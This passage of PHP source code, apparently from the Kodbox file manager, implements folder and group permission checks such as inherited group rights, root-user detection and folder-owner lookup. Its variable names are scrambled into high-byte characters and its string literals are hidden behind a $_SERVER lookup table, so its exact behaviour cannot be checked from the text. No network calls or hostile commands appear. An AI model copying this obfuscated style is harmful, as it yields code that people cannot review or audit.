$ãŸ´½£[$¢¯¿Œ´[191]]; break; } } } return $this->sourceListAuth($™ŠºÊü); } private function sourceListAuth($Ÿ÷Â¼œŠ) { $™Ó¼é–Ó =& $_SERVER[¹Éµ„ºå]; $ÓğÔŠØ = Model($™Ó¼é–Ó[1523])->sourceListInfo($Ÿ÷Â¼œŠ, !0); $­‹µ¢ßâ = $this->sourceAuthSelect($Ÿ÷Â¼œŠ); $Ÿ‚öé‰• = array(); $…¤Õ¨ëò = array(); foreach ($ÓğÔŠØ as $¡¡ğ±Ã) { unset($¡¡ğ±Ã[$™Ó¼é–Ó[543]]); unset($¡¡ğ±Ã[$™Ó¼é–Ó[541]]); unset($¡¡ğ±Ã[$™Ó¼é–Ó[502]]); unset($¡¡ğ±Ã[$™Ó¼é–Ó[90]]); $ôá…ìâœ = $­‹µ¢ßâ[$¡¡ğ±Ã[$™Ó¼é–Ó[191]]]; if (!$ôá…ìâœ) { continue; } $¡¡ğ±Ã[$™Ó¼é–Ó[2370]] = $this->authTargetInfo($ôá…ìâœ); $¡¡ğ±Ã[$™Ó¼é–Ó[602]] = rtrim($¡¡ğ±Ã[$™Ó¼é–Ó[608]], $™Ó¼é–Ó[8]) . $™Ó¼é–Ó[8] . ltrim($¡¡ğ±Ã[$™Ó¼é–Ó[602]], $™Ó¼é–Ó[8]); $Ÿ‚öé‰•[] = $¡¡ğ±Ã; $İ½ÆÛµ½ = count(explode($™Ó¼é–Ó[8], trim($¡¡ğ±Ã[$™Ó¼é–Ó[602]], $™Ó¼é–Ó[8]))); $…¤Õ¨ëò[] = $İ½ÆÛµ½ + ($¡¡ğ±Ã[$™Ó¼é–Ó[33]] == $™Ó¼é–Ó[78] ? 0 : 1000); } array_multisort($…¤Õ¨ëò, SORT_ASC, $Ÿ‚öé‰•); return $Ÿ‚öé‰•; } private function groupChidldAllRootSource($¥ôùãã) { $Û›ü¡Ë† =& $_SERVER[¹Éµ„ºå]; $ßÑÜ¢à¥ = Model($Û›ü¡Ë†[1482])->groupChildrenAll($¥ôùãã); $çº­í²ª = array($Û›ü¡Ë†[190] => 0, $Û›ü¡Ë†[589] => array($Û›ü¡Ë†[7], $ßÑÜ¢à¥), $Û›ü¡Ë†[188] => SourceModel::TYPE_GROUP); $ÌÒäÕŞ = Model($Û›ü¡Ë†[924])->field($Û›ü¡Ë†[191])->where($çº­í²ª)->select(); $ÌÒäÕŞ = array_to_keyvalue($ÌÒäÕŞ, $Û›ü¡Ë†[12], $Û›ü¡Ë†[191]); return $ÌÒäÕŞ; } private function authTargetInfo($¢ŒåŠ—Š) { $Â«º¯¨Ÿ =& $_SERVER[¹Éµ„ºå]; $Ö „¬”µ = array(); $À‰Æ¯°Å = array(); $Ò¹˜±Å = 2 << 25; foreach ($¢ŒåŠ—Š as $çÈ³Ã) { $Ñóé¥…Æ = Model($Â«º¯¨Ÿ[591])->listData($çÈ³Ã[$Â«º¯¨Ÿ[1630]]); if (!$Ñóé¥…Æ) { continue; } if ($çÈ³Ã[$Â«º¯¨Ÿ[188]] == SourceModel::TYPE_USER) { $©Õ¼«±¥ = Model($Â«º¯¨Ÿ[597])->getInfoSimpleOuter($çÈ³Ã[$Â«º¯¨Ÿ[589]]); if ($©Õ¼«±¥[$Â«º¯¨Ÿ[1582]] == $Â«º¯¨Ÿ[1369]) { continue; } if ($©Õ¼«±¥[$Â«º¯¨Ÿ[1582]] == $Â«º¯¨Ÿ[228]) { $©Õ¼«±¥[$Â«º¯¨Ÿ[32]] = LNG($Â«º¯¨Ÿ[2374]); } } else { $©Õ¼«±¥ = Model($Â«º¯¨Ÿ[605])->getInfoSimple($çÈ³Ã[$Â«º¯¨Ÿ[589]]); } if (!$©Õ¼«±¥) { continue; } $©Õ¼«±¥[$Â«º¯¨Ÿ[556]] = $Ñóé¥…Æ; $Ö „¬”µ[] = $©Õ¼«±¥; $ŠÜÎÒê = 0; if ($çÈ³Ã[$Â«º¯¨Ÿ[188]] == SourceModel::TYPE_GROUP) { $ŠÜÎÒê = $Ò¹˜±Å * 2; } if ($çÈ³Ã[$Â«º¯¨Ÿ[188]] == SourceModel::TYPE_USER) { $ŠÜÎÒê = $Ò¹˜±Å; } if ($çÈ³Ã[$Â«º¯¨Ÿ[188]] == SourceModel::TYPE_USER && $çÈ³Ã[$Â«º¯¨Ÿ[589]] == $Â«º¯¨Ÿ[228]) { $ŠÜÎÒê = 0; } $À‰Æ¯°Å[] = $Ñóé¥…Æ[$Â«º¯¨Ÿ[502]] + $ŠÜÎÒê; } array_multisort($À‰Æ¯°Å, SORT_DESC, $Ö „¬”µ); return $Ö „¬”µ; } public function getAllChildrenByUser($¹ä²Ğ·Ç, $ÈÂ ¾¸) { $Ø¶¸ëà =& $_SERVER[¹Éµ„ºå]; $¹ÛèöÏğ = Model($Ø¶¸ëà[617])->getInfo($ÈÂ ¾¸); if (!$ÈÂ ¾¸ || !$¹ä²Ğ·Ç || !$¹ÛèöÏğ) { return array(); } $§¾ü’è = Model($Ø¶¸ëà[1523])->sourceInfo($¹ä²Ğ·Ç); $Ö¹§ıîÕ = array(); $¥Ã¦Ó÷¯ = 1; if ($§¾ü’è[$Ø¶¸ëà[190]] == $Ø¶¸ëà[228] && $§¾ü’è[$Ø¶¸ëà[589]] != $¥Ã¦Ó÷¯ && $this->groupContainUser($§¾ü’è[$Ø¶¸ëà[589]], $ÈÂ ¾¸)) { foreach ($¹ÛèöÏğ[$Ø¶¸ëà[1483]] as $óÉÌ¼—‚) { $³é¶«ê¸ = Model($Ø¶¸ëà[605])->getInfo($óÉÌ¼—‚[$Ø¶¸ëà[1484]]); $™…“üÑ‘ = Model($Ø¶¸ëà[617])->getInfoSimpleOuter($ÈÂ ¾¸); $™…“üÑ‘[$Ø¶¸ëà[556]] = $óÉÌ¼—‚[$Ø¶¸ëà[502]]; if (Model($Ø¶¸ëà[591])->authCheckAction($óÉÌ¼—‚[$Ø¶¸ëà[502]][$Ø¶¸ëà[502]], $Ø¶¸ëà[1554])) { continue; } $ƒéŠ–»î = array($Ø¶¸ëà[32] => $Ø¶¸ëà[1387] . $³é¶«ê¸[$Ø¶¸ëà[32]], $Ø¶¸ëà[191] => $³é¶«ê¸[$Ø¶¸ëà[90]][$Ø¶¸ëà[191]], $Ø¶¸ëà[87] => KodIO::make($³é¶«ê¸[$Ø¶¸ëà[90]][$Ø¶¸ëà[191]]), $Ø¶¸ëà[190] => $Ø¶¸ëà[228], $Ø¶¸ëà[188] => $Ø¶¸ëà[598], $Ø¶¸ëà[33] => $Ø¶¸ëà[639], $Ø¶¸ëà[602] => $³é¶«ê¸[$Ø¶¸ëà[609]], $Ø¶¸ëà[1484] => $³é¶«ê¸[$Ø¶¸ëà[1484]], $Ø¶¸ëà[606] => $³é¶«ê¸[$Ø¶¸ëà[190]], $Ø¶¸ëà[2370] => array($™…“üÑ‘)); $Ö¹§ıîÕ[$ƒéŠ–»î[$Ø¶¸ëà[191]]] = $ƒéŠ–»î; } } $¯êİú¥Ü = array(); $° ‘çµí = $this->getAllChildren($¹ä²Ğ·Ç); foreach ($° ‘çµí as $½€™¥‹ø) { $Ê¾ÌõÃ = !1; foreach ($½€™¥‹ø[$Ø¶¸ëà[2370]] as $¡¦‘¸Ôø) { if ($¡¦‘¸Ôø[$Ø¶¸ëà[1582]]) { if ($¡¦‘¸Ôø[$Ø¶¸ëà[1582]] == $ÈÂ ¾¸) { $Ê¾ÌõÃ = !0; break; } } if ($¡¦‘¸Ôø[$Ø¶¸ëà[1484]]) { if ($this->groupContainUser($¡¦‘¸Ôø[$Ø¶¸ëà[1484]], $ÈÂ ¾¸)) { $Ê¾ÌõÃ = !0; break; } } } if ($Ê¾ÌõÃ) { $¯êİú¥Ü[] = $½€™¥‹ø; } $î¥Ø¬¼ = $½€™¥‹ø[$Ø¶¸ëà[191]]; if (isset($Ö¹§ıîÕ[$î¥Ø¬¼])) { $½€™¥‹ø[$Ø¶¸ëà[2370]][] = $Ö¹§ıîÕ[$î¥Ø¬¼][0]; $Ö¹§ıîÕ[$î¥Ø¬¼] = !1; } } $Ö¹§ıîÕ = array_filter(array_values($Ö¹§ıîÕ)); $¯êİú¥Ü = array_merge($Ö¹§ıîÕ, $¯êİú¥Ü); return $¯êİú¥Ü; } public function setAllChildrenByUser($ˆŠóÏº , $Çä…Í¤Î, $Şğ°âÂ¥) { $Êà¶¸‹Ö =& $_SERVER[¹Éµ„ºå]; $Ïå¹ï¶î = $this->getAllChildrenByUser($ˆŠóÏº , $Çä…Í¤Î); if (!$Şğ°âÂ¥ || !$Ïå¹ï¶î) { return !1; } foreach ($Ïå¹ï¶î as $ííø¶¿ó) { $™‡¬·Å = array(); foreach ($ííø¶¿ó[$Êà¶¸‹Ö[2370]] as $™ÙÃ‰) { $æÁË¡®İ = $™ÙÃ‰[$Êà¶¸‹Ö[556]]; $ÙÍ³üíÚ = $™ÙÃ‰[$Êà¶¸‹Ö[1582]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ĞÉÃ†² = $™ÙÃ‰[$Êà¶¸‹Ö[1582]] ? $™ÙÃ‰[$Êà¶¸‹Ö[1582]] : $™ÙÃ‰[$Êà¶¸‹Ö[1484]]; if ($™ÙÃ‰[$Êà¶¸‹Ö[1582]] && $™ÙÃ‰[$Êà¶¸‹Ö[1582]] == $Çä…Í¤Î) { continue; } $™‡¬·Å[] = array($Êà¶¸‹Ö[191] => $ííø¶¿ó[$Êà¶¸‹Ö[191]], $Êà¶¸‹Ö[188] => $ÙÍ³üíÚ, $Êà¶¸‹Ö[589] => intval($ĞÉÃ†²), $Êà¶¸‹Ö[1630] => isset($æÁË¡®İ[$Êà¶¸‹Ö[487]]) ? intval($æÁË¡®İ[$Êà¶¸‹Ö[487]]) : 0, $Êà¶¸‹Ö[2334] => isset($æÁË¡®İ[$Êà¶¸‹Ö[2334]]) ? intval($æÁË¡®İ[$Êà¶¸‹Ö[2334]]) : -1); } $™‡¬·Å[] = array($Êà¶¸‹Ö[191] => $ííø¶¿ó[$Êà¶¸‹Ö[191]], $Êà¶¸‹Ö[188] => SourceModel::TYPE_USER, $Êà¶¸‹Ö[589] => intval($Çä…Í¤Î), $Êà¶¸‹Ö[1630] => intval($Şğ°âÂ¥), $Êà¶¸‹Ö[2334] => -1); $this->where(array($Êà¶¸‹Ö[506] => $ííø¶¿ó[$Êà¶¸‹Ö[191]]))->delete(); $this->addAll($™‡¬·Å); } return !0; } public function get($»‹ËÍË´) { $§ßÃÈ°Ê = $this->getSourceList(array($»‹ËÍË´), !0); return $§ßÃÈ°Ê[0]; } public function getSourceList($ŒÊÅİÂ¯, $Í«ÑÅ˜ = false, $¦¹ˆöÀœ = false) { $¦ºöñ‰Õ =& $_SERVER[¹Éµ„ºå]; if (!$ŒÊÅİÂ¯) { return array(); } $¼ëÂ°ùÑ = Model($¦ºöñ‰Õ[1523]); if (!$Í«ÑÅ˜ && count($ŒÊÅİÂ¯) == 1) { $Í«ÑÅ˜ = array(); $Í«ÑÅ˜[$ŒÊÅİÂ¯[0]] = $¼ëÂ°ùÑ->sourceInfo($ŒÊÅİÂ¯[0]); } if (!$Í«ÑÅ˜) { $ÉÊ°„½Â = array($¦ºöñ‰Õ[506] => array($¦ºöñ‰Õ[507], $ŒÊÅİÂ¯)); $Í«ÑÅ˜ = $¼ëÂ°ùÑ->field($¦ºöñ‰Õ[2375])->where($ÉÊ°„½Â)->select(); $Í«ÑÅ˜ = array_to_keyvalue($Í«ÑÅ˜, $¦ºöñ‰Õ[191]); } $âùæÜÒ = $ŒÊÅİÂ¯; foreach ($Í«ÑÅ˜ as $€¥‹± ƒ => $‹Œä‡­…) { $Ìà÷ÎóĞ = $¼ëÂ°ùÑ->parentLevelArray($‹Œä‡­…[$¦ºöñ‰Õ[604]]); $âùæÜÒ = array_merge($âùæÜÒ, array(intval($€¥‹± ƒ)), array_reverse($Ìà÷ÎóĞ)); } $âùæÜÒ = array_values(array_unique($âùæÜÒ)); if (!$âùæÜÒ) { return array(); } $ÖµÅí‰ = $this->sourceAuthSelect($âùæÜÒ); $‹âÑï¸© = array(); foreach ($âùæÜÒ as $èª¬Á) { if (isset($ÖµÅí‰[$èª¬Á])) { $‹âÑï¸©[$èª¬Á] = $ÖµÅí‰[$èª¬Á]; } } $ñĞƒ²÷” = $this->userIsRoot($¦¹ˆöÀœ); $¶®¸ü£¢ = AuthModel::authAll(); $µøÁûÙÄ = array($¦ºöñ‰Õ[503] => $¶®¸ü£¢, $¦ºöñ‰Õ[2376] => array($¦ºöñ‰Õ[508] => 0, $¦ºöñ‰Õ[2177] => $¶®¸ü£¢, $¦ºöñ‰Õ[509] => LNG($¦ºöñ‰Õ[2357]), $¦ºöñ‰Õ[2192] => $¦ºöñ‰Õ[2358])); $«Èš‡¸È = array(); foreach ($Í«ÑÅ˜ as $èª¬Á => $³ş«å¬) { if ($ñĞƒ²÷” && $GLOBALS[$¦ºöñ‰Õ[6]][$¦ºöñ‰Õ[2190]]) { $«Èš‡¸È[$èª¬Á] = $µøÁûÙÄ; continue; } $«Èš‡¸È[$èª¬Á] = $this->makeSourceAuth($³ş«å¬, $‹âÑï¸©, $¦¹ˆöÀœ); } return $«Èš‡¸È; } public function authDeepCheck($çÑ¡ü¦¼, $¤Ş·ÈÈ† = false) { $Œ—ü‘ =& $_SERVER[¹Éµ„ºå]; $¤Ş·ÈÈ† = $¤Ş·ÈÈ† ? $¤Ş·ÈÈ† : USER_ID; $™­âòš = $this->makeAuthDeep($¤Ş·ÈÈ†); if (!in_array($çÑ¡ü¦¼, $™­âòš[$Œ—ü‘[2377]])) { return !1; } $‡îßÓ–î = array(); foreach ($™­âòš[$Œ—ü‘[2378]] as $Á‚¯‹Åî => $ú˜¬¾µ) { if (!in_array($çÑ¡ü¦¼, $ú˜¬¾µ)) { continue; } $‡îßÓ–î[] = $Á‚¯‹Åî; } if (!$‡îßÓ–î) { return !1; } $Ó³ÚíŠõ = $‡îßÓ–î ? $‡îßÓ–î[0] : $çÑ¡ü¦¼; return array($Œ—ü‘[503] => -1, $Œ—ü‘[556] => array($Œ—ü‘[508] => $Œ—ü‘[1369], $Œ—ü‘[2177] => $Œ—ü‘[228], $Œ—ü‘[509] => LNG($Œ—ü‘[2379]), $Œ—ü‘[2192] => $Œ—ü‘[2380]), $Œ—ü‘[2368] => LNG($Œ—ü‘[2381]), $Œ—ü‘[2382] => $this->sourceAuthInfo($Ó³ÚíŠõ)); } protected function makeAuthDeep($ÊÀ¢ğù´ = false) { $×§¯¦£™ =& $_SERVER[¹Éµ„ºå]; static $÷³€ô—Ë = array(); $ÊÀ¢ğù´ = $ÊÀ¢ğù´ ? $ÊÀ¢ğù´ : USER_ID; if (isset($÷³€ô—Ë[$ÊÀ¢ğù´])) { return $÷³€ô—Ë[$ÊÀ¢ğù´]; } $‹¾«ÉÊ¤ = Model($×§¯¦£™[2383])->listData(); $ù‰ğ½¾Ä = array(); foreach ($‹¾«ÉÊ¤ as $òÎ™›ô¦) { if ($òÎ™›ô¦[$×§¯¦£™[502]] == 0 && $òÎ™›ô¦[$×§¯¦£™[2191]] == $×§¯¦£™[91]) { $ù‰ğ½¾Ä[] = $òÎ™›ô¦[$×§¯¦£™[487]]; } } $£—í¯ÎÒ = $this->userGroupParents($ÊÀ¢ğù´); $ÎÅØ¼Ğ¯ = array($×§¯¦£™[188] => SourceModel::TYPE_USER, $×§¯¦£™[589] => $ÊÀ¢ğù´); if ($£—í¯ÎÒ) { $ÎÅØ¼Ğ¯ = array(array($×§¯¦£™[188] => SourceModel::TYPE_USER, $×§¯¦£™[589] => $ÊÀ¢ğù´), array($×§¯¦£™[188] => SourceModel::TYPE_GROUP, $×§¯¦£™[589] => array($×§¯¦£™[507], $£—í¯ÎÒ)), $×§¯¦£™[1157] => $×§¯¦£™[2273]); } $ÁËš…Ø½ = $this->field($×§¯¦£™[2384])->where($ÎÅØ¼Ğ¯)->select(); $˜¨Â¢“ = array(); $Èå¡Ğ“¾ = array_to_keyvalue_group($ÁËš…Ø½, $×§¯¦£™[191]); foreach ($Èå¡Ğ“¾ as $ˆö“îª => $ÇŸ‘¦Å­) { $áÂùı¿Ê = $this->authArrayCheck($ÇŸ‘¦Å­, $ÊÀ¢ğù´); if ($áÂùı¿Ê[$×§¯¦£™[503]] > 0) { $˜¨Â¢“[] = $ˆö“îª . $×§¯¦£™[12]; } } if ($£—í¯ÎÒ) { $€ıæ¾ãô = Model($×§¯¦£™[605]); foreach ($£—í¯ÎÒ as $÷óÀ¼‚®) { $±ø®´ÕË = $€ıæ¾ãô->getInfo($÷óÀ¼‚®); if (!$±ø®´ÕË || !is_array($±ø®´ÕË[$×§¯¦£™[90]])) { continue; } $˜¨Â¢“[] = $±ø®´ÕË[$×§¯¦£™[90]][$×§¯¦£™[191]]; } } $Ã ™Êˆ¸ = array(); $ãıÊ‹ùë = $£—í¯ÎÒ; $›ÃòšŞ• = Model($×§¯¦£™[1523]); $€ıæ¾ãô = Model($×§¯¦£™[605]); $ìˆĞûÂ = array(); $è›Å ½„ = array(); $óÕĞıì‡ = array(); $‡ÏÏ¬ÂÓ = array(); if ($˜¨Â¢“) { $×ø“‚Ñ× = $›ÃòšŞ•->where(array($×§¯¦£™[191] => array($×§¯¦£™[507], $˜¨Â¢“)))->select(); foreach ($×ø“‚Ñ× as $Şİïå¡) { if ($Şİïå¡[$×§¯¦£™[520]] == $×§¯¦£™[91]) { continue; } $Â÷ê‘°Ğ = $›ÃòšŞ•->parentLevelArray($Şİïå¡[$×§¯¦£™[604]]); $Ã ™Êˆ¸ = array_merge($Ã ™Êˆ¸, $Â÷ê‘°Ğ); $ãıÊ‹ùë[] = $Şİïå¡[$×§¯¦£™[589]]; $ìˆĞûÂ[$Şİïå¡[$×§¯¦£™[191]]] = $Â÷ê‘°Ğ; $è›Å ½„[$Şİïå¡[$×§¯¦£™[191]]] = $Şİïå¡[$×§¯¦£™[589]]; } } $ãıÊ‹ùë = array_values(array_unique($ãıÊ‹ùë)); $›úÀô = $ãıÊ‹ùë; foreach ($›úÀô as $÷óÀ¼‚®) { $±ø®´ÕË = $€ıæ¾ãô->getInfo($÷óÀ¼‚®); $Â÷ê‘°Ğ = $›ÃòšŞ•->parentLevelArray($±ø®´ÕË[$×§¯¦£™[604]]); $ãıÊ‹ùë = array_merge($ãıÊ‹ùë, $Â÷ê‘°Ğ); } $ãıÊ‹ùë = array_values(array_unique($ãıÊ‹ùë)); foreach ($ãıÊ‹ùë as $÷óÀ¼‚®) { $±ø®´ÕË = $€ıæ¾ãô->getInfo($÷óÀ¼‚®); $Ã ™Êˆ¸[] = $±ø®´ÕË[$×§¯¦£™[90]][$×§¯¦£™[191]]; $óÕĞıì‡[$÷óÀ¼‚®] = $±ø®´ÕË[$×§¯¦£™[90]][$×§¯¦£™[191]]; $‡ÏÏ¬ÂÓ[$÷óÀ¼‚®] = $›ÃòšŞ•->parentLevelArray($±ø®´ÕË[$×§¯¦£™[604]]); } foreach ($ìˆĞûÂ as $Ï’ïÃÌè => $Ìéœíµ) { $Ã¾Ç¦¨Å = $è›Å ½„[$Ï’ïÃÌè]; if (!$Ã¾Ç¦¨Å || !$óÕĞıì‡[$Ã¾Ç¦¨Å]) { continue; } $©´ÓŠÜù = array(); foreach ($‡ÏÏ¬ÂÓ[$Ã¾Ç¦¨Å] as $÷óÀ¼‚®) { $©´ÓŠÜù[] = $óÕĞıì‡[$÷óÀ¼‚®]; } $ìˆĞûÂ[$Ï’ïÃÌè] = array_merge($©´ÓŠÜù, $Ìéœíµ); } $Ã ™Êˆ¸ = array_values(array_unique($Ã ™Êˆ¸)); $¹ß£Ë€Õ = array($×§¯¦£™[2377] => $Ã ™Êˆ¸, $×§¯¦£™[2378] => $ìˆĞûÂ); $÷³€ô—Ë[$ÊÀ¢ğù´] = $¹ß£Ë€Õ; return $¹ß£Ë€Õ; } private function makeSourceAuth($¯ıÂŞ­…, $™ù­½õÂ, $‰Ã‹ÑÀ = false) { $ Šö¢¬ =& $_SERVER[¹Éµ„ºå]; $ç¿ÛË®ä = $ Šö¢¬[91]; $ÃÈËŠÖë = $¯ıÂŞ­…[$ Šö¢¬[589]]; $¨îÅãƒ” = $¯ıÂŞ­…[$ Šö¢¬[188]] == SourceModel::TYPE_GROUP; $’ Ò¬¨ = $¨îÅãƒ” ? $this->groupRootAuth($ÃÈËŠÖë, $‰Ã‹ÑÀ) : !1; if ($’ Ò¬¨ && Model($ Šö¢¬[591])->authCheckAction($’ Ò¬¨[$ Šö¢¬[502]], $ Šö¢¬[1554])) { return $this->groupAuthInfo($’ Ò¬¨, $ÃÈËŠÖë); } $¥ùæî†‰ = Model($ Šö¢¬[1523])->parentLevelArray($¯ıÂŞ­…[$ Šö¢¬[604]]); $¥ùæî†‰ = array_merge(array($¯ıÂŞ­…[$ Šö¢¬[191]]), array_reverse($¥ùæî†‰)); $º”Ãã¿Ñ = !1; foreach ($¥ùæî†‰ as $ÔÔ…Œ·©) { if (!isset($™ù­½õÂ[$ÔÔ…Œ·©])) { continue; } $¼¾¬Í™€ = $this->authMake($™ù­½õÂ[$ÔÔ…Œ·©], $‰Ã‹ÑÀ); if ($¼¾¬Í™€[$ Šö¢¬[556]]) { $º”Ãã¿Ñ = $¼¾¬Í™€; break; } } if (!$¨îÅãƒ”) { return $º”Ãã¿Ñ; } if (!$º”Ãã¿Ñ && $’ Ò¬¨) { $º”Ãã¿Ñ = $this->groupAuthInfo($’ Ò¬¨, $ÃÈËŠÖë); } if (!$º”Ãã¿Ñ) { $•ÒíşŠ¡ = Model($ Šö¢¬[605])->getInfo($ÃÈËŠÖë); $†±æ´İ™ = explode($ Šö¢¬[50], trim($•ÒíşŠ¡[$ Šö¢¬[604]], $ Šö¢¬[50])); $†±æ´İ™ = array_reverse($†±æ´İ™); foreach ($†±æ´İ™ as $Òñ Ôèİ) { if ($Òñ Ôèİ == $ Šö¢¬[228] || $Òñ Ôèİ == $ç¿ÛË®ä) { continue; } $åšçğØÚ = $this->groupRootAuth($Òñ Ôèİ, $‰Ã‹ÑÀ); if (!$åšçğØÚ) { continue; } $º”Ãã¿Ñ = $this->groupAuthInfo($åšçğØÚ, $Òñ Ôèİ); break; } } if (!$º”Ãã¿Ñ || $º”Ãã¿Ñ[$ Šö¢¬[503]] <= 0) { $ö£İŒ…ô = $this->authDeepCheck($¯ıÂŞ­…[$ Šö¢¬[191]], $‰Ã‹ÑÀ); if ($ö£İŒ…ô) { $º”Ãã¿Ñ = $ö£İŒ…ô; } } return $º”Ãã¿Ñ; } private function userIsRoot($Şüµê = false) { $…§Ş½•ç =& $_SERVER[¹Éµ„ºå]; if (!$Şüµê && KodUser::isRoot()) { return !0; } $×éÕğ = Model($…§Ş½•ç[617])->getInfo($Şüµê); $ôãûñŒ = Model($…§Ş½•ç[2361])->listData($×éÕğ[$…§Ş½•ç[2362]]); if ($ôãûñŒ && $ôãûñŒ[$…§Ş½•ç[595]][$…§Ş½•ç[2365]] == 1) { return !0; } return !1; } private function sourceAuthInfo($õŒµº£ï) { $±Ï·ıò =& $_SERVER[¹Éµ„ºå]; $û†ó®øİ = Model($±Ï·ıò[1523]); $Ë×‚á¾£ = $û†ó®øİ->sourceInfo($õŒµº£ï); if (!$Ë×‚á¾£) { return !1; } $û†ó®øİ->groupPathDisplay($Ë×‚á¾£); $ÌÑ£Éù– = array($Ë×‚á¾£); $ÌÑ£Éù– = $û†ó®øİ->_listAppendPath($ÌÑ£Éù–, !1); $Ë×‚á¾£ = $ÌÑ£Éù–[0]; $¡ëÒÎØœ = $Ë×‚á¾£[$±Ï·ıò[602]]; if (isset($Ë×‚á¾£[$±Ï·ıò[610]])) { $Àîğö— = explode($±Ï·ıò[8], trim($Ë×‚á¾£[$±Ï·ıò[602]], $±Ï·ıò[8])); array_shift($Àîğö—); $¡ëÒÎØœ = $Ë×‚á¾£[$±Ï·ıò[608]] . $±Ï·ıò[2385] . implode($±Ï·ıò[8], $Àîğö—); } return array($±Ï·ıò[32] => $Ë×‚á¾£[$±Ï·ıò[32]], $±Ï·ıò[191] => $Ë×‚á¾£[$±Ï·ıò[191]], $±Ï·ıò[87] => KodIO::make($Ë×‚á¾£[$±Ï·ıò[191]]), $±Ï·ıò[602] => $¡ëÒÎØœ); } private function groupAuthInfo($¢éâ¨É¥, $–‰¹äÏ) { $‰ÆŸ½À— =& $_SERVER[¹Éµ„ºå]; $œ¼å„¹š = Model($‰ÆŸ½À—[605])->getInfo($–‰¹äÏ); return array($‰ÆŸ½À—[2386] => intval($¢éâ¨É¥[$‰ÆŸ½À—[502]]), $‰ÆŸ½À—[2376] => $¢éâ¨É¥, $‰ÆŸ½À—[2387] => LNG($‰ÆŸ½À—[2388]), $‰ÆŸ½À—[2382] => array($‰ÆŸ½À—[509] => $œ¼å„¹š[$‰ÆŸ½À—[32]], $‰ÆŸ½À—[87] => KodIO::make($œ¼å„¹š[$‰ÆŸ½À—[90]][$‰ÆŸ½À—[191]]), $‰ÆŸ½À—[2389] => $œ¼å„¹š[$‰ÆŸ½À—[609]])); } protected function groupRootAuth($ÔÇµ×˜Ì, $Ø½Åšó‡ = false) { $ôÈÒÕ‰ =& $_SERVER[¹Éµ„ºå]; $Ø½Åšó‡ = $Ø½Åšó‡ ? $Ø½Åšó‡ : USER_ID; $…ÆÈŒ…Õ = $Ø½Åšó‡ . $ôÈÒÕ‰[2390] . $ÔÇµ×˜Ì; static $Ï¦¦ÏÃ€ = array(); if (isset($Ï¦¦ÏÃ€[$…ÆÈŒ…Õ])) { return $Ï¦¦ÏÃ€[$…ÆÈŒ…Õ]; } $ŸëõÂ²ğ = Model($ôÈÒÕ‰[605])->getInfo($ÔÇµ×˜Ì); $ÑîÚºøÒ = $this->userGroupList($Ø½Åšó‡); $¨€µ¯“š = isset($ÑîÚºøÒ[$ÔÇµ×˜Ì]) ? $ÑîÚºøÒ[$ÔÇµ×˜Ì][$ôÈÒÕ‰[502]] : !1; if ($¨€µ¯“š && Model($ôÈÒÕ‰[591])->authCheckAction($¨€µ¯“š[$ôÈÒÕ‰[502]], $ôÈÒÕ‰[1554])) { $Ï¦¦ÏÃ€[$…ÆÈŒ…Õ] = $¨€µ¯“š; return $¨€µ¯“š; } $ïÏØ¾ôÛ = $this->sourceAuthSelect($ŸëõÂ²ğ[$ôÈÒÕ‰[90]][$ôÈÒÕ‰[191]]); $¾À„öÁ = $ïÏØ¾ôÛ ? $this->authMake($ïÏØ¾ôÛ, $Ø½Åšó‡) : !1; $í°Ì™İÛ = $¾À„öÁ ? $¾À„öÁ[$ôÈÒÕ‰[556]] : !1; $Ï¦¦ÏÃ€[$…ÆÈŒ…Õ] = $í°Ì™İÛ ? $í°Ì™İÛ : $¨€µ¯“š; return $Ï¦¦ÏÃ€[$…ÆÈŒ…Õ]; } public function authOwnerApply($ä¹ÒĞõ¨) { $Ú›ÌóÜÜ =& $_SERVER[¹Éµ„ºå]; if (empty($ä¹ÒĞõ¨[$Ú›ÌóÜÜ[502]]) || isset($ä¹ÒĞõ¨[$Ú›ÌóÜÜ[1573]]) && $ä¹ÒĞõ¨[$Ú›ÌóÜÜ[1573]]) { return $ä¹ÒĞõ¨; } if (AuthModel::authCheckRoot($ä¹ÒĞõ¨[$Ú›ÌóÜÜ[502]][$Ú›ÌóÜÜ[503]])) { return $ä¹ÒĞõ¨; } $£ûüĞª˜ = Model($Ú›ÌóÜÜ[1523])->parentLevelArray($ä¹ÒĞõ¨[$Ú›ÌóÜÜ[604]]); $£ûüĞª˜ = array_merge(array($ä¹ÒĞõ¨[$Ú›ÌóÜÜ[191]]), array_reverse($£ûüĞª˜)); $ƒ¥ÎªŒ‘ = $this->sourceAuthSelect($£ûüĞª˜); $ÜŒ–¦öó = array(); $¿‡ŸŒŞ« = array(); foreach ($ƒ¥ÎªŒ‘ as $·”Ø°ü => $”Êª¨›À) { $š×Ã©û® = $this->authFolderOwnerUser($”Êª¨›À); $ÜŒ–¦öó[$·”Ø°ü] = $š×Ã©û®; $¿‡ŸŒŞ« = array_merge($¿‡ŸŒŞ«, $š×Ã©û®[$Ú›ÌóÜÜ[684]]); if ($š×Ã©û®[$Ú›ÌóÜÜ[2391]]) { break; } } if (count($¿‡ŸŒŞ«) == 0) { $¿‡ŸŒŞ« = $this->authFolderOwnerGroup($ä¹ÒĞõ¨[$Ú›ÌóÜÜ[589]]); } $¿‡ŸŒŞ« = array_unique($¿‡ŸŒŞ«); if (AuthModel::authCheckRoot($ä¹ÒĞõ¨[$Ú›ÌóÜÜ[502]][$Ú›ÌóÜÜ[503]])) { $¿‡ŸŒŞ«[] = USER_ID; } $ä¹ÒĞõ¨[$Ú›ÌóÜÜ[502]][$Ú›ÌóÜÜ[2392]] = Model($Ú›ÌóÜÜ[597])->userListInfo($¿‡ŸŒŞ«); return $ä¹ÒĞõ¨; } private function authFolderOwnerGroup($êŞÇÜÆË) { $Ê¼ÇìÛÜ =& $_SERVER[¹Éµ„ºå]; $ñ¼®óÖõ = Model($Ê¼ÇìÛÜ[2265])->where(array($Ê¼ÇìÛÜ[1484] => $êŞÇÜÆË))->select(); $ğ†´ôß = array(); if (!$ñ¼®óÖõ) { return $ğ†´ôß; } foreach ($ñ¼®óÖõ as $¿¢Íû¬µ) { $îµŞ©ëË = $this->authInfo($¿¢Íû¬µ); if (AuthModel::authCheckRoot($îµŞ©ëË[$Ê¼ÇìÛÜ[502]])) { $ğ†´ôß[] = $¿¢Íû¬µ[$Ê¼ÇìÛÜ[1582]]; } } return $ğ†´ôß; } private function authFolderOwnerUser($îş‚ŠˆÅ) { $’ß¢¾‹ì =& $_SERVER[¹Éµ„ºå]; $ßøİ÷¨º = array(); $ëƒÌéÂ = !1; 